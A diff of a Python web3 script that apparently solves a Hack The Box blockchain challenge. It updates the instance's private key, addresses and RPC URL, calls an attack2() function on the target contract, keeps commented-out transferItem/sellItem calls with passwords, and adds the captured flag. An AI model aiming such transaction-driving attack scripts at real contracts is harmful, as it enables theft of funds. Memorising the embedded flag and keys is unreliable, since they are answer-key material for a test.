@@ -4,10 +4,10 @@ from web3.gas_strategies.rpc import rpc_gas_price_strategy
 from solcx import compile_source, install_solc, compile_files
 
 x = {
-    "PrivateKey": "0x473f71b49c2bb1fb0861ae89c62777032d28dffbebc65ea5a1f410b266dddb7d",
-    "Address": "0x6b09e09EBd7E693803BfB5D9C8860761ABe1Ec90",
-    "TargetAddress": "0xFd0f4dEA4607aCDD97d7eb39516Ee6F1bC1e1323",
-    "setupAddress": "0x478A1d93Df5133BDE16e3D82D6Ea6e46dFa3A091"
+    "PrivateKey": "0xb8b1201a73ef0af8ecb9012dfd088a3634a5a50b869d9ee537c1fecfde1b8bf0",
+    "Address": "0xeBA008B0E300C309237a653CAc89712a5d5e30A9",
+    "TargetAddress": "0x63C4EE95E5bF1e9134ec8229426401D3d2f1e8eE",
+    "setupAddress": "0xecfF688911eE24Cf7342956Af0AE677F974b6093"
 }
 
 PrivateKey =    x["PrivateKey"]
@@ -15,9 +15,9 @@ Address =       x["Address"]
 TargetContract = x["TargetAddress"]
 SetupContract =  x["setupAddress"]
 
-url = 'http://157.245.43.189:31623/rpc'
+url = 'http://167.172.62.51:32528/rpc'
 
-Target2Contract = "0x2c116320e54f19105bb0F36Abb3CFb6eB110d852"
+Target2Contract = "0x272fe504eb9ADe9221455aAebd2b9C77f7BA4a03"
 
 w3 = Web3(Web3.HTTPProvider(url))
 block_number = w3.eth.block_number
@@ -67,6 +67,7 @@ compiled = compile_files(["Contract.sol"], output_values=["abi"], solc_version="
 abi = compiled['Contract.sol:Contract']['abi']
 
 contract_instance2 = w3.eth.contract(address=Target2Contract, abi=abi)
+
 construct_txn = contract_instance2.functions.attack2().build_transaction(
         {
                 'from': account_from['address'],
@@ -155,6 +156,44 @@ tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
 tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
 print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')
 
+'''
+construct_txn = contract_instance2.functions.transferItem(name, owner, password2).build_transaction(
+        {
+                'from': account_from['address'],
+                'nonce': w3.eth.get_transaction_count(account_from['address']),
+                #'from': Target2Address,
+                #'nonce': w3.eth.get_transaction_count(Target2Address),
+                'chainId': w3.eth.chain_id,
+                #'value' : 1
+                #"gasPrice": w3.to_wei(50, 'gwei'),
+                #"gas": 21000,
+                #"value": w3.to_wei("0", "ether"),
+        }
+)
+tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
+tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
+tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
+print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')
+
+construct_txn = contract_instance2.functions.sellItem(name, password).build_transaction(
+        {
+                'from': account_from['address'],
+                'nonce': w3.eth.get_transaction_count(account_from['address']),
+                #'from': Target2Address,
+                #'nonce': w3.eth.get_transaction_count(Target2Address),
+                'chainId': w3.eth.chain_id,
+                #'value' : 1
+                #"gasPrice": w3.to_wei(50, 'gwei'),
+                #"gas": 21000,
+                #"value": w3.to_wei("0", "ether"),
+        }
+)
+tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
+tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
+tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
+print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')
+'''
+
 compiled = compile_files(["Setup.sol"], output_values=["abi"], solc_version="0.8.13")
 abi = compiled['Setup.sol:Setup']['abi']
 
@@ -162,4 +201,4 @@ contract_instance = w3.eth.contract(address=SetupContract, abi=abi)
 number = contract_instance.functions.isSolved().call()
 
 print(f'The current number stored is: { number } ')
-#
+#HTB{und32574nd1n9_7h3_s70rag3_47_7h3_m4x}
